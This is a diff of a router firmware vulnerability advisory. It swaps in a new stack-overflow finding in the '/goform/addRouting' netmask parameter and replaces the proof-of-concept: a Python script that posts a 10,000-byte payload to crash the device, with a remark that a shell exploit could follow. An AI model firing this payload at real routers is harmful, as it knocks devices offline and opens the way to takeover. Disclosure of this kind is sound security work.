@@ -13,11 +13,17 @@ Below is the latest firmware
 
 ## Vulnerability details
 
-Vulnerability occurs in /goform/form2Wl5RepeaterStep2.cgi.  With the setRepeaterSecurity function,the contents obtained by the pskValue parameter are passed to V13, and then the contents matched by V13 are decoded and put into the V19 stack without size checking, resulting in a stack overflow.
+Vulnerability occurs in /goform/addRouting.  The content obtained by netmask parameter is passed to V3, and then the content matched by V3 is write into the V13 stack without size checking, resulting in a stack overflow.
 
 ![](img/2.png#center)
 
+
+## Vulnerability verify
+
 ![](img/3.png#center)
+
+![](img/4.png#center)
+
 ## POC
 
 Gets the token ID
@@ -30,24 +36,23 @@ Run poc
 
 ```python
 import requests
-import base64
+
 
 tokenid = ''
 
-url = 'http://192.168.0.1/goform/form2RepeaterStep2.cgi'
+url = 'http://192.168.0.1/goform/addRouting'
 
-payload = base64.b64encode(b'a' * 10000)
+payload = b'a' * 10000
 
 data = {
     'tokenid': tokenid,
-    'method': '6',
-    'authType': 'a',
-    'pskValue': payload
+    'dest': '1.1.1.1',
+    'netmask': payload
 }
 
+print('payload sending...')
 r = requests.post(url, data)
-hunzi = r.text
-print(hunzi)
+print('end')
 ```
 
 You can see the router crash, and finally you can write an exp to get a shell
